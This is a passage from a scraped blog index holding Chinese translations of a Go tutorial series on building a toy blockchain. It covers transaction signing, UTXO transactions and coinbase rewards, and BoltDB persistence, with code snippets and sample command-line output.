[]byte) (Transaction, error) { bci := bc.Iterator() for { block := bci.Next() for _, tx := range block.Transactions { if bytes.Compare(tx.ID, ID) == 0 { return *tx, nil } } if len(block.PrevBlockHash) == 0 { break } } return Transaction{}, errors.New(\u0026#34;Transaction is not found\u0026#34;) } func (bc *Blockchain) SignTransaction(tx *Transaction, privKey ecdsa.PrivateKey) { prevTXs := make(map[string]Transaction) for _, vin := range tx.Vin { prevTX, err := bc.FindTransaction(vin.Txid) prevTXs[hex.EncodeToString(prevTX.ID)] = prevTX } tx.Sign(privKey, prevTXs) } func (bc *Blockchain) VerifyTransaction(tx *Transaction) bool { prevTXs := make(map[string]Transaction) for _, vin := range tx.Vin { prevTX, err := bc.FindTransaction(vin.Txid) prevTXs[hex.EncodeToString(prevTX.ID)] = prevTX } return tx.Verify(prevTXs) } 这些函数很直接：FindTransaction通过ID寻找交易（它需要迭代区块链上的所有区块）；SignTransaction接受交易，寻找交易的引用，并且对它进行签名；``VerifyTransaction`也差不多做相同的事情，但是会验证交易。\n现在，我们需要真正的签名并且验证交易。签名发生在NewUTXOTransaction中：\nfunc NewUTXOTransaction(from, to string, amount int, bc *Blockchain) *Transaction { ... tx := Transaction{nil, inputs, outputs} tx.ID = tx.Hash() bc.SignTransaction(\u0026amp;tx, wallet.PrivateKey) return \u0026amp;tx } 验证发生在交易被放入区块之前：\nfunc (bc *Blockchain) MineBlock(transactions []*Transaction) { var lastHash []byte for _, tx := range transactions { if bc.VerifyTransaction(tx) != true { log.Panic(\u0026#34;ERROR: Invalid transaction\u0026#34;) } } ... } 完成！让我们多检查几次：\n$ blockchain_go createwallet Your new address: 1AmVdDvvQ977oVCpUqz7zAPUEiXKrX5avR $ blockchain_go createwallet Your new address: 1NE86r4Esjf53EL7fR86CsfTZpNN42Sfab $ blockchain_go createblockchain -address 1AmVdDvvQ977oVCpUqz7zAPUEiXKrX5avR 000000122348da06c19e5c513710340f4c307d884385da948a205655c6a9d008 Done! $ blockchain_go send -from 1AmVdDvvQ977oVCpUqz7zAPUEiXKrX5avR -to 1NE86r4Esjf53EL7fR86CsfTZpNN42Sfab -amount 6 0000000f3dbb0ab6d56c4e4b9f7479afe8d5a5dad4d2a8823345a1a16cf3347b Success! $ blockchain_go getbalance -address 1AmVdDvvQ977oVCpUqz7zAPUEiXKrX5avR Balance of \u0026#39;1AmVdDvvQ977oVCpUqz7zAPUEiXKrX5avR\u0026#39;: 4 $ blockchain_go getbalance -address 1NE86r4Esjf53EL7fR86CsfTZpNN42Sfab Balance of \u0026#39;1NE86r4Esjf53EL7fR86CsfTZpNN42Sfab\u0026#39;: 6 没问题。极好的！\n让我们同时把NewUTXOTransaction里的bc.SignTransaction(\u0026amp;tx, wallet.PrivateKey)注释掉，让没有被签名的交易不能被挖矿：\nfunc NewUTXOTransaction(from, to string, amount int, bc *Blockchain) *Transaction { ... tx := Transaction{nil, inputs, outputs} tx.ID = tx.Hash() // bc.SignTransaction(\u0026amp;tx, wallet.PrivateKey) return \u0026amp;tx } $ go install $ blockchain_go send -from 1AmVdDvvQ977oVCpUqz7zAPUEiXKrX5avR -to 1NE86r4Esjf53EL7fR86CsfTZpNN42Sfab -amount 1 2017/09/12 16:28:15 ERROR: Invalid transaction 总结 我们迅速的进行并且实现了比特币中很多关键的特点，这是极好的！我们差不多实现了除了网络之外的一切，在下一部分，我们将完成交易。\nLinks:\nFull source codes Public-key cryptography Digital signatures Elliptic curve Elliptic curve cryptography ECDSA Technical background of Bitcoin addresses Address Base58 A gentle introduction to elliptic curve cryptography ","date":"2019-09-10T14:02:02+08:00","permalink":"https://lizonglingo.github.io/p/%E4%BD%BF%E7%94%A8golang%E6%9E%84%E5%BB%BA%E5%8C%BA%E5%9D%97%E9%93%BEpart5%E5%9C%B0%E5%9D%80/","title":"使用Golang构建区块链Part5：地址"},{"content":" 在对照实现本部分内容时，我进行的稍微困难，因为本篇中的实现代码与前面的代码相差的太多。所以，当遇到困难时，就直接去查源码。在后面会有对应代码改动的链接。\n介绍 交易是比特币的核心，将交易安全可靠的存储是区块链唯一目的，所以没有人可以在交易创建之后进行修改。今天我们将开始实现交易。但由于这是一个较为庞大的部分，我将它分成了两部分：在本部分，我们会实现交易的通用机制，在后续的那部分中我们将会实现细节部分。\n对了，由于代码改动了很多，并且没有必要全部细说。你们可以在这里找到所有的改动。\nThere is no spoon（这没勺子） 如果你曾经开发过Web应用，为了实现支付你会在数据库中创建这样的tables：accounts 和 transactions 。一个账户会保存一个用户的信息，包含他们的私人信息以及账户余额，同时一个交易会存储money从一个账户到另一个账户的转移信息。在比特币中，支付是实现于一个完全不同的方式。在这：\n没有账户。 没有余额。 没有地址。 没有币。 没有发送者和接受者。 因为区块链是一个公共开放的数据库，我们不想存储钱包所有者的敏感信息在里面。币不会在账户中被收集。\n交易不会把money从一个地址转移到另一个。这里也没有字段或者说是特征来持有账户的余额。这里只有交易。但是，交易里有什么呢？\n比特币交易 Github译者补充：\n点击 这里 在 blockchain.info 查看下图中的交易信息。\n交易包含一些输入（inputs）和一些输出（outputs）：\ntype Transaction struct { ID []byte Vin []TXInput Vout []TXOutput } 一个新的交易的入账/输入取决于上一个交易的出账/输出（不过这儿有一个例外，我们在稍后会讨论到）。出账/输出是币实际上存储在哪里。下面的图表对交易的内在联系进行了示范：\n请注意：\n有的出账没有和入账相连。 在一个交易中，入账涉及多个交易的出账。 一个入账必须依赖一个出账。 整篇文章中，我们将会使用像“钱”、“币”、“花费”、“发出”、“账户”等等这样的字眼。但是对比特币并不存在这样的概念，交易仅仅是通过一个脚本来锁定一些值，而这些实际的值只可以被锁定他们的人解锁。\n（ Transactions just lock values with a script, which can be unlocked only by the one who locked them.）\n交易出账 让我们从交易出账开始：\ntype TXOutput struct { Value int ScriptPubKey string } 实际上，这是存储“币”的出账（注意一下上面的“value”字段）。这个存储被一个保存在__ScriptPubKey__里的“谜题”锁定。往深了说，比特币使用了一个叫做__Script__的脚本语言，它用于定义交易输出（出账）的锁定和解锁逻辑。这个语言有一些原始（它有意这样设计以便避免可能的入侵和滥用），但是我们不会讨论它的细节。你可以在这里找到所有细节的解释。\n在比特币中，_value_字段存储着_satoshis_的数量，而不是比特币的数量。1 _satoshis_是1亿比特币分之1（0.00000001 BTC）。所以这是比特币货币中最小的单位（像是分）。\n因为我们没有实现地址，我们现在将避免涉及到全部逻辑相关的脚本。__ScriptPubKey__将会存储为一个专用的字段（用户定义钱包地址）。\n顺便说一下，拥有脚本语言意味着比特币也可以用做智能合约平台。\n关于交易输出有一个重要的点是它们是不可分割的，这意味着你不能使用这个值的一部分。当一个交易输出被一个新的交易引用时，它会全部花费。如果这个值比所需要的多，找零会自动生成并返回给发送者。这有些相似于现实世界中你支付的场景，就是说，一个5元的钞票去买一个1元的东西，会得到4元找零。\n交易入账 这儿是交易入账：\ntype TXInput struct { Txid []byte Vout int ScriptSig string } 如前面所述，一个交易的入账涉及到前一个交易的出账：Txid__存储这个交易的__ID，__Vout__存储这个交易中一个出账的索引。__ScriptSig__是一个为出账时提供使用的__ScriptPubKey__所需要数据的脚本（ScriptSig是个脚本，这个脚本提供数据，提供的数据是ScriptPubKey所需要的，ScriptPubKey是出账时所需要的脚本）。如果数据正确，交易出账可以被解锁，它的值可以用于生成新的出账；如果不正确，这个出账则不能被入账所引用。这就是保证用户不能花费属于别人的币的一个机制。\n再说一次，因为我们没有实现地址，__ScriptSig__将仅仅存储一个专用的用户定义钱包地址。我们在下一篇文章将会实现公钥和签名检查。\n让我们总结一下。交易出账是“币”所存在的地方。每一个交易出账都带有一个解锁的脚本，决定着解锁这个交易出账的逻辑。每一个新的交易必须至少有一个入账和出账。一个入账会引用上个交易的出账和数据(ScriptSig 字段),这些被用来在出账中解锁脚本去解锁并使用其中的值创建新的出账。（好吧我长难句不过关\u0026hellip;原文： An input references an output from a previous transaction and provides data (the ScriptSig field) that is used in the output’s unlocking script to unlock it and use its value to create new outputs.）\n但是，先有谁：入账还是出账？\nThe egg（蛋） 在比特币中，是先有蛋，后有鸡的。这个交易入账和交易出账的相互关系逻辑是经典的“鸡和蛋”的关系：入账产生出账，而出账使入账成为可能。在比特币中，交易出账产生于交易入账之前，也就是，先有交易出账。\n当矿工开始挖矿时，他会添加一笔币基交易coinbase（我们可以理解为凭空造币的交易）。一个币基交易是一种特殊的交易，不需要任何先前的交易出账的存在。它就会“莫名其妙的”产生交易出账，可以理解为凭空造钱。这个蛋就不需要鸡。这是对矿工挖出新块的一个奖励。\n正如你所知道的，在区块链的最开始有一个创世区块。这个区块是区块链中最开始的一个出账。由于没有先前的交易和输出，所以它不需要前面的交易输出。\n让我们创建一个coinbase交易：\nfunc NewCoinbaseTX(to, data string) *Transaction { if data == \u0026#34;\u0026#34; { data = fmt.Sprintf(\u0026#34;Reward to \u0026#39;%s\u0026#39;\u0026#34;, to) } txin := TXInput{[]byte{}, -1, data} txout := TXOutput{subsidy, to} tx := Transaction{nil, []TXInput{txin}, []TXOutput{txout}} tx.SetID() return \u0026amp;tx } 一个coinbase交易只有一个输入。在我们的实现中，它的Txid是空的而且Vout等于-1.同时，一个coinbase交易也不需要在ScriptSig中存储脚本。取而代之的，专有数据存储在这里。\n在比特币中，最开始的一个交易中带有这样的信息： “The Times 03/Jan/2009 Chancellor on brink of second bailout for banks”. 在这里可以自个看。\nsubsidy是奖励的总数。在区块链中，这个值不会存储在任何地方而是仅仅根据区块的总数量进行计算：区块被分为210000个。挖这些创世区块产生50BTC，并且每210000个区块这个奖励减半。在我们的实现中，我们将这个奖励存储为一个常量（至少现在是这样😉）。\n在区块链中存储交易 从现在开始，每个区块必须存储至少1个交易同时没有可能挖一个不包含交易的区块。这意味我们应该移出Block中的Data字段然后代替的，存储交易字段：\ntype Block struct { Timestamp int64 Transactions []*Transaction PrevBlockHash []byte Hash []byte Nonce int } NewBlock以及NewGenesisBlock也必须相应的改变：\nfunc NewBlock(transactions []*Transaction, prevBlockHash []byte) *Block { block := \u0026amp;Block{time.Now().Unix(), transactions, prevBlockHash, []byte{}, 0} ... } func NewGenesisBlock(coinbase *Transaction) *Block { return NewBlock([]*Transaction{coinbase}, []byte{}) } 在这部分以及后面的代码中，由于我理解能力的原因（或是作者描述的略微粗略），这部分以及以后的代码都是在Part3和Part4代码比较里一一对应继续修改的。链接在文章开始的地方。\n接下来调整创建区块链的部分：\nfunc CreateBlockchain(address string) *Blockchain { ... err = db.Update(func(tx *bolt.Tx) error { cbtx := NewCoinbaseTX(address, genesisCoinbaseData) genesis := NewGenesisBlock(cbtx) b, err := tx.CreateBucket([]byte(blocksBucket)) err = b.Put(genesis.Hash, genesis.Serialize()) ... }) ... } 我将完整部分也给大家贴上：\n// creates a new blockchain db func CreateBlockchain(address string) *Blockchain { if dbExists() { fmt.Println(\u0026#34;Blockchain is already exists.\u0026#34;) os.Exit(1) } var tip []byte db, err := bolt.Open(dbFile, 0600, nil) if err != nil { log.Panic(err) } err = db.Update(func(tx *bolt.Tx) error { cbtx := NewCoinbaseTX(address, genesisCoinbaseData) genesis := NewGenesisBlock(cbtx) b, err := tx.CreateBucket([]byte(blocksBucket)) if err != nil { log.Panic(err) } err = b.Put(genesis.Hash, genesis.Serialize()) if err != nil { log.Panic(err) } err = b.Put([]byte(\u0026#34;l\u0026#34;), genesis.Hash) if err != nil { log.Panic(err) } tip = genesis.Hash return nil }) if err != nil { log.Panic(err) } bc := Blockchain{tip, db} return \u0026amp;bc } 现在，这个函数接收了一个地址，这个地址就是接受挖出创世区块的奖励的。\n工作量证明 工作量证明算法必须考虑到存储在区块中的交易，去保证区块链作为一个存储交易仓库的一致性和可靠性。所以，我们现在必须修改Proof-Of-Work.prepareData方法：\nfunc (pow *ProofOfWork) prepareData(nonce int) []byte { data := bytes.Join( [][]byte{ pow.block.PrevBlockHash, pow.block.HashTransactions(), // This line was changed IntToHex(pow.block.Timestamp), IntToHex(int64(targetBits)), IntToHex(int64(nonce)), }, []byte{}, ) return data } 现在我们用pow.block.HashTransactions()来代替pow.block.Data，就是：\nfunc (b *Block) HashTransactions() []byte { var txHashes [][]byte var txHash [32]byte for _, tx := range b.Transactions { txHashes = append(txHashes, tx.ID) } txHash = sha256.Sum256(bytes.Join(txHashes, []byte{})) return txHash[:] } 此外，我们使用取哈希的原理为数据提供一个独一无二的特征。我们希望所有在区块中的交易都通过单独的一个哈希去唯一的标识自己。为了实现它，我们取每个交易的哈希，将它们连接起来，然后去计算它们连接组合的哈希。\n比特币使用了更加复杂的技术：它用一颗Merkle tree代表一个区块中包含的所有交易并且在工作量证明系统中使用树的根哈希值。这个方法运行快速的检查一个区块是否包含某个确定的交易，只需要树根的哈希而不需要下载整个交易。\n让我们检查一下到目前为止一切是否正确：\n$ blockchain_go createblockchain -address Ivan 00000093450837f8b52b78c25f8163bb6137caf43ff4d9a01d1b731fa8ddcc8a Done! 实话说做到这里，这个我没做出来，应该还是缺一些的。在整篇文章涉及到的代码全部完成后，我才实现这样的内容。\n好！我们现在收到我们的第一笔挖矿奖励。但是，我们怎样检查我们的余额呢？\n未花费交易输出 我们需要找到全部的未花费交易输出（unspent transaction outputs - UTXO）。未花费表示这些输出没有在任何地方被任何交易入账所引用（也就是哪一个交易的入账都没有使用它）。在上面的图解中，这些就是的：\ntx0, output 1； tx1, output 0； tx3, output 0； tx4, output 0。 当然，在我们检查余额时，我们并不需要全部的这些，只需要那些可以被我们所拥有的key解锁的（目前我们还没有key的实现，我们会用用户定义地址去代替）。首先，让我们在入账和出账上定义加锁和解锁方法：\nfunc (in *TXInput) CanUnlockOutputWith(unlockingData string) bool { return in.ScriptSig == unlockingData } func (out *TXOutput) CanBeUnlockedWith(unlockingData string) bool { return out.ScriptPubKey == unlockingData } 这里我们仅仅使用unlockingData与脚本字段进行比较。这些模块将会在后面的文章进行改进，在我们实现基于私钥的地址之后。\n下一步-找到包含未花费输出的交易-这有点困难：\nfunc (bc *Blockchain) FindUnspentTransactions(address string) []Transaction { var unspentTXs []Transaction spentTXOs := make(map[string][]int) bci := bc.Iterator() for { block := bci.Next() for _, tx := range block.Transactions { txID := hex.EncodeToString(tx.ID) Outputs: for outIdx, out := range tx.Vout { // Was the output spent? if spentTXOs[txID] != nil { for _, spentOut := range spentTXOs[txID] { if spentOut == outIdx { continue Outputs } } } if out.CanBeUnlockedWith(address) { unspentTXs = append(unspentTXs, *tx) } } if tx.IsCoinbase() == false { for _, in := range tx.Vin { if in.CanUnlockOutputWith(address) { inTxID := hex.EncodeToString(in.Txid) spentTXOs[inTxID] = append(spentTXOs[inTxID], in.Vout) } } } } if len(block.PrevBlockHash) == 0 { break } } return unspentTXs } 因为交易被存储在区块中，我们不得不检查区块链中的每一个区块。我们从出账开始：\nif out.CanBeUnlockedWith(address) { unspentTXs = append(unspentTXs, tx) } 如果一笔出账被我们搜寻未花费交易输出的地址锁住了（也就是：这个出账的地址就是搜寻时所用的地址），那么这就是我们想要的出账。但是在获得它之前，我们需要检查一个出账是否早已被一个入账所引用：\nif spentTXOs[txID] != nil { for _, spentOut := range spentTXOs[txID] { if spentOut == outIdx { continue Outputs } } } 我们跳过那些已经被入账所引用的出账（这些值早已转移到其他出账，因此我们不能计算它们）。在检查出账之后我们获得所有的，可以被提供的地址解锁出账上面的锁，的入账（它不会用到coinbase交易上，因为它们没有解锁出账）：\nPS：这里我翻译不好，把原文贴上了\nAfter checking outputs we gather all inputs that could unlock outputs locked with the provided address (this doesn’t apply to coinbase transactions, since they don’t unlock outputs)\nif tx.IsCoinbase() == false { for _, in := range tx.Vin { if in.CanUnlockOutputWith(address) { inTxID := hex.EncodeToString(in.Txid) spentTXOs[inTxID] = append(spentTXOs[inTxID], in.Vout) } } } 这个函数返回一个包含未花费输出的交易列表。为了计算余额，我们还需要一个函数，接受交易返回交易输出：\nfunc (bc *Blockchain) FindUTXO(address string) []TXOutput { var UTXOs []TXOutput unspentTransactions := bc.FindUnspentTransactions(address) for _, tx := range unspentTransactions { for _, out := range tx.Vout { if out.CanBeUnlockedWith(address) { UTXOs = append(UTXOs, out) } } } return UTXOs } 就是它了！现在我们可以实现getbalance命令：\nfunc (cli *CLI) getBalance(address string) { bc := NewBlockchain(address) defer bc.db.Close() balance := 0 UTXOs := bc.FindUTXO(address) for _, out := range UTXOs { balance += out.Value } fmt.Printf(\u0026#34;Balance of \u0026#39;%s\u0026#39;: %d\\n\u0026#34;, address, balance) } 账户的余额是所有被账户地址锁住的未花费交易输出的总额。\n让我们在挖出创世区块后检查一下余额：\n$ blockchain_go getbalance -address Ivan Balance of \u0026#39;Ivan\u0026#39;: 10 这是我们的第一桶金！\n发送币 现在，我们想发送一些币给其他人。为此，我们需要创建一个新的交易，把它放进区块里，然后挖矿。到目前为止，我们只实现了coinbase交易（一种特殊的交易），现在我们需要一个更有普遍性意义的交易：\nfunc NewUTXOTransaction(from, to string, amount int, bc *Blockchain) *Transaction { var inputs []TXInput var outputs []TXOutput acc, validOutputs := bc.FindSpendableOutputs(from, amount) if acc \u0026lt; amount { log.Panic(\u0026#34;ERROR: Not enough funds\u0026#34;) } // Build a list of inputs for txid, outs := range validOutputs { txID, err := hex.DecodeString(txid) for _, out := range outs { input := TXInput{txID, out, from} inputs = append(inputs, input) } } // Build a list of outputs outputs = append(outputs, TXOutput{amount, to}) if acc \u0026gt; amount { outputs = append(outputs, TXOutput{acc - amount, from}) // a change } tx := Transaction{nil, inputs, outputs} tx.SetID() return \u0026amp;tx } 在创建新的输出之前，我们必须寻找所有的未花费输出并且确保它们存储了足够的“钱”。这就是FindSpendableOutputs方法所做的。在那之后，入账所需要引用的出账就被找出来了。接下来，我们创建两个输出：\n一个由接收者的地址锁定。这就是真实的币到一个地址的转移。 一个由发送者的地址锁定。这是一个改变。它仅仅在未花费交易输出的总额大于新交易所需要的总额时被创建。记住，输出是__不可分割__的。 FindSpendableOutputs方法依赖于我们先前定义的FindUnspentTransactions方法：\nfunc (bc *Blockchain) FindSpendableOutputs(address string, amount int) (int, map[string][]int) { unspentOutputs := make(map[string][]int) unspentTXs := bc.FindUnspentTransactions(address) accumulated := 0 Work: for _, tx := range unspentTXs { txID := hex.EncodeToString(tx.ID) for outIdx, out := range tx.Vout { if out.CanBeUnlockedWith(address) \u0026amp;\u0026amp; accumulated \u0026lt; amount { accumulated += out.Value unspentOutputs[txID] = append(unspentOutputs[txID], outIdx) if accumulated \u0026gt;= amount { break Work } } } } return accumulated, unspentOutputs } 这个方法迭代所有的未花费交易并计算它们的总额。当积累的值大于或者等于我们需要进行转换的值时，它就会停止并且返回积累的总值已经由交易ID所聚会的出账索引。我们不想花更多的钱。\n现在，我们可以修改Blockchain.MineBlock方法：\nfunc (bc *Blockchain) MineBlock(transactions []*Transaction) { ... newBlock := NewBlock(transactions, lastHash) ... } 完整代码：\nfunc (bc *Blockchain) MineBlock(transactions []*Transaction) { var lasthash []byte // BoltDB的只读事务，读取最后一个区块的hash，用它挖下一个区块的hash err := bc.db.View(func(tx *bolt.Tx) error { b := tx.Bucket([]byte(blocksBucket)) lasthash = b.Get([]byte(\u0026#34;l\u0026#34;)) return nil }) if err!= nil { log.Panic(err) } // 用提供的交易以及上一个区块的hash构建新的区块 newBlock := NewBlock(transactions, lasthash) // 挖到新区块后进行DB存储并更新“l”键 err = bc.db.Update(func(tx *bolt.Tx) error { b := tx.Bucket([]byte(blocksBucket)) err := b.Put(newBlock.Hash, newBlock.Serialize()) if err != nil { log.Panic(err) } // 更新“l”键 err = b.Put([]byte(\u0026#34;l\u0026#34;), newBlock.Hash) if err != nil { log.Panic(err) } bc.tip = newBlock.Hash return nil }) } 最后，我们实现send命令：\nfunc (cli *CLI) send(from, to string, amount int) { bc := NewBlockchain(from) defer bc.db.Close() tx := NewUTXOTransaction(from, to, amount, bc) bc.MineBlock([]*Transaction{tx}) fmt.Println(\u0026#34;Success!\u0026#34;) } 发送币意味着创建一个交易，并且通过挖出一个区块将其添加到区块链上。但是比特币没有像我们实现这些。相反的，它把所有交易存储到内存池（一般叫做矿池）中，当矿工准备好挖出一个矿时，它打包内存池中的所有交易并且产生一个候选区块。交易只有在包含它的区块被挖出来并且添加到区块链之后才被确认。\n然我们检查发送币命令的运行：\n$ blockchain_go send -from Ivan -to Pedro -amount 6 00000001b56d60f86f72ab2a59fadb197d767b97d4873732be505e0a65cc1e37 Success! $ blockchain_go getbalance -address Ivan Balance of \u0026#39;Ivan\u0026#39;: 4 $ blockchain_go getbalance -address Pedro Balance of \u0026#39;Pedro\u0026#39;: 6 现在，让我们创建更多的交易确定发送在更多的输出程序中可以很好的运行：\n$ blockchain_go send -from Pedro -to Helen -amount 2 00000099938725eb2c7730844b3cd40209d46bce2c2af9d87c2b7611fe9d5bdf Success! $ blockchain_go send -from Ivan -to Helen -amount 2 000000a2edf94334b1d94f98d22d7e4c973261660397dc7340464f7959a7a9aa Success! 现在，Helen\u0026rsquo;s的币被两个出账锁定：一个来自Pedro一个来自Ivan。让我们分别发送它们：\n$ blockchain_go send -from Helen -to Rachel -amount 3 000000c58136cffa669e767b8f881d16e2ede3974d71df43058baaf8c069f1a0 Success! $ blockchain_go getbalance -address Ivan Balance of \u0026#39;Ivan\u0026#39;: 2 $ blockchain_go getbalance -address Pedro Balance of \u0026#39;Pedro\u0026#39;: 4 $ blockchain_go getbalance -address Helen Balance of \u0026#39;Helen\u0026#39;: 1 $ blockchain_go getbalance -address Rachel Balance of \u0026#39;Rachel\u0026#39;: 3 看起来很好！让我们测试一个失败情况：\n$ blockchain_go send -from Pedro -to Ivan -amount 5 panic: ERROR: Not enough funds $ blockchain_go getbalance -address Pedro Balance of \u0026#39;Pedro\u0026#39;: 4 $ blockchain_go getbalance -address Ivan Balance of \u0026#39;Ivan\u0026#39;: 2 总结 噢！它并不容易，但好歹我们现在有交易了！虽然，一些类似于区块链这种加密货币的特性遗失了：\n地址。我们没有真实的，基于私钥的地址。 奖励。挖矿是毫无利益可图的。 UTXO集合。需要扫描整个区块获得余额，当区块非常非常多的时候这很花费时间。而且在后面我们要验证交易的话也非常花费时间。UTXO集就是为了解决这些问题并且让交易操作更快捷。 内存池（矿池）。这是交易在打包到区块之前所要存储的地方。在我们目前的实现中，一个区块只包含一个交易，这是非常低效的。 Links：\nFull source codes Transaction Merkle tree Coinbase ","date":"2019-09-07T15:33:16+08:00","permalink":"https://lizonglingo.github.io/p/%E4%BD%BF%E7%94%A8golang%E6%9E%84%E5%BB%BA%E5%8C%BA%E5%9D%97%E9%93%BEpart4%E4%BA%A4%E6%98%93-1/","title":"使用Golang构建区块链Part4：交易-1"},{"content":"介绍 到现在，我们已经构建了一个有工作量证明系统和可以挖矿的区块链。我们的实现离一个具有完整功能的区块链又进了一步，但是它仍然少一些重要的性质。今天，我们要将区块链存储到数据库中，在这之后，我们将做一个简单的命令行接口来支持区块链的操作。在它的一个重要的本质中，区块链是一个分布式数据库；我们现在要省略“分布式”的部分，而集中精力于“数据存储”部分。\n数据库的选择 目前，在我们的实现中并没有数据库；反而我们在每一次运行程序创建区块时都存储在内存中。我们既不能重复使用区块链也不能与其他人共享，因此我们需要将它存储在磁盘中。\n我们需要哪一个数据库呢？事实上，任何一个都可以。在比特币的原始论文中，没有说明使用哪一个特定的数据库。所以，使用什么数据库完全取决于开发者。 Bitcoin Core ，最初由中本聪发布的，现在是比特币的一个参考实现，它使用的是LevelDB（虽然它在2012年才发布客户端）。而我们将要使用的是\u0026hellip;\nBoltDB 原因：\n它非常简单便捷。 它是由Go语言实现的。 它不需要运行任何一个服务器。 它允许我们想要的数据结构。 在__BoltDB__ Github上的README写道：\nBolt 是一个纯键值存储的 Go 数据库，启发自 Howard Chu 的 LMDB. 它旨在为那些无须一个像 Postgres 和 MySQL 这样有着完整数据库服务器的项目，提供一个简单，快速和可靠的数据库。\n由于 Bolt 意在用于提供一些底层功能，简洁便成为其关键所在。它的 API 并不多，并且仅关注值的获取和设置。仅此而已。\n听起来很完美的契合了我们的需求！让我们快速的回顾一下它：\n__BoltDB__是一个键值存储结构，这就意味着它不像关系型数据库（MySQL、PostgreSQL等）有表，没有行、列。相反的，数据以一种key-value（键值对）的组合形式存储（就像Go语言中的__map__结构）。键值对存储在桶中，这是有意的给键值对分组（这有些像关系型数据库中的表）。因此，为了获得一个值，你需要知道一个桶（bucket）和一个键（key）。\n关于__BoltDB__一个重要的点是它没有数据类型：键和值都是以字节数组的形式存储。由于我们要存储Go的数据结构（具体来说是__Block__），我们需要将它们进行序列化。也就是说，实现一个可以将Go结构体转化为字节数组并可以从字节数组恢复到Go结构体的机制。我们将使用encoding/gob来实现这个，但是JSON、XML、Protocol Buffers等也是可以的。我们使用encoding/gob是因为它简单而且是Go的标准库。\n数据库结构 在开始实现持久化的逻辑之前，我们需要决定怎样将数据存储到数据库中。为此，我们参考比特币的做法。\n简单来说，比特币使用了两个桶（bucket）来存储数据：\n__blocks__存储链上区块的元数据描述。 __chainstate__存储链的状态，也就是目前所有的未花费交易输出以及一些数据。 同时，区块被存储为磁盘上不同的文件。出于对性能的考虑：加载单个的区块不需要从内存中加载所有（或者部分）文件。我们不需要实现这些。\n在 blocks 中， key -\u0026gt; value 对应关系是这样的：\n‘b’ + 32 字节的区块 hash -\u0026gt; 区块索引记录 ‘f’ + 4 字节文件数字 -\u0026gt; 文件信息记录 ‘l’ -\u0026gt; 4 字节文件数字： 最后一个使用过的区块文件数字 ‘R’ -\u0026gt; 1 字节布尔值： 我们是否要去重新索引 ‘F’ + 1 字节标志名长度 + 标志名 -\u0026gt; 1 字节布尔值： 开或关的多种标志 ‘t’ + 32 字节交易 hash -\u0026gt; 交易索引记录 在 chainstate, key -\u0026gt; value 对应关系是这样的：\n‘c’ + 32 字节交易 hash -\u0026gt; 未使用的交易出账记录 ‘B’ -\u0026gt; 32 字节区块 hash： 数据库应该表示的未使用交易出账的区块哈希 （更详细的解释可以在这里找到）\n因为我们现在还不需要交易，我们只需要有一个__blocks__桶就可以。同时，就像前面说的，我们将以单个文件的形式存储在数据库中，不需要在分开的文件中存储区块。所以我们也不需要任何与文件相关的数字编号。因此，我们只需要这些键值的对应关系：\n32 字节区块 hash -\u0026gt; 区块数据(序列化后的) ‘l’ -\u0026gt; 链上最后一个区块的 hash 以上，是我们在实现持久化之前所需要知道的全部。\n序列化 如前文所说，在__BoltDB__中数据只能是__[]byte__的形式，我们想存储__Block__结构在数据库中。我们将使用encoding/gob来对结构体进行序列化。\n让我们实现区块的__Serialize__方法（为了简洁，我们暂时忽略错误处理）：\nfunc (b *Block) Serialize() []byte { var result bytes.Buffer encoder := gob.NewEncoder(\u0026amp;result) err := encoder.Encode(b) return result.Bytes() } 这个模块非常直接了当：首先，我们为所要序列化的数据定义了一个buffer来存储；然后我们初始化了一个__gob encoder__并且对区块进行编码；结果以一个字节数组的形式返回。\n接下来，我们需要一个反序列化的函数接受输入的字节数组并返回一个__Block__区块。这不是一个方法而是一个独立的函数：\nfunc DeserializeBlock(d []byte) *Block { var block Block decoder := gob.NewDecoder(bytes.NewReader(d)) err := decoder.Decode(\u0026amp;block) return \u0026amp;block } 这就是反序列化了！\n持久化 让我们开始__NewBlockchain__函数。目前，它创建一个新的__Blockchain__并且添加一个创世纪块进去。我们希望它可以做：\n打开一个数据库文件。 检查里面是否以及存在一个区块链在里面。 如果这里已经有了一个区块链： 创建一个新的区块链实例。 设置这个区块链实例的__tip__为数据库中最后一个区块的哈希。 代码中，它看起来像：\nfunc NewBlockchain() *Blockchain { var tip []byte db, err := bolt.Open(dbFile, 0600, nil) err = db.Update(func(tx *bolt.Tx) error { b := tx.Bucket([]byte(blocksBucket)) if b == nil { genesis := NewGenesisBlock() b, err := tx.CreateBucket([]byte(blocksBucket)) err = b.Put(genesis.Hash, genesis.Serialize()) err = b.Put([]byte(\u0026#34;l\u0026#34;), genesis.Hash) tip = genesis.Hash } else { tip = b.Get([]byte(\u0026#34;l\u0026#34;)) } return nil }) bc := Blockchain{tip, db} return \u0026amp;bc } 让我们分开来看：\ndb, err := bolt.Open(dbFile, 0600, nil) 这是打开一个__BoltDB__数据库文件的标准形式。需要注意的是，如果没有文件它是不会返回错误的。\nerr = db.Update(func(tx *bolt.Tx) error { ... }) 在__BoltDB__中，数据库通过一个事务进行操作。这里有两种事务：只读（read-only）和读写（read-write）。这里我们开启一个读写事务（db.Update(\u0026hellip;)），因为我们希望将创世纪块写入数据库。\nb := tx.Bucket([]byte(blocksBucket)) if b == nil { genesis := NewGenesisBlock() b, err := tx.CreateBucket([]byte(blocksBucket)) err = b.Put(genesis.Hash, genesis.Serialize()) err = b.Put([]byte(\u0026#34;l\u0026#34;), genesis.Hash) tip = genesis.Hash } else { tip = b.Get([]byte(\u0026#34;l\u0026#34;)) } 这是这个函数的核心。在这里，我们获得了一个bucket去存储我们的区块：如果它存在，我们从里面读取键值\u0026quot;l\u0026quot;（字母L小写，不是1）；如果不存在，我们就生成一个创世纪块，创建一个桶，将区块保存进去，之后更新\u0026quot;l\u0026quot;键，使其存储区块链的最后一个区块的哈希。\n同时，注意一下创建__Blockchain__的新方法：\nbc := Blockchain{tip, db} 我们不再存储所有的区块，取而代之的是仅仅存储区块链的__tip__。同时我们也保存一个数据库连接，因为我们想只打开它一次，并且让它在程序运行的过程中一直保持着连接。所以，__Blockchain__结构看起来就像这样：\ntype Blockchain struct { tip []byte db *bolt.DB } 接下来我们想做的就是更新__AddBlock__方法：现在添加区块到区块链上不是简单的向数组中添加一个元素了。从现在开始我们将把区块存储到数据库中：\nfunc (bc *Blockchain) AddBlock(data string) { var lastHash []byte err := bc.db.View(func(tx *bolt.Tx) error { b := tx.Bucket([]byte(blocksBucket)) lastHash = b.Get([]byte(\u0026#34;l\u0026#34;)) return nil }) newBlock := NewBlock(data, lastHash) err = 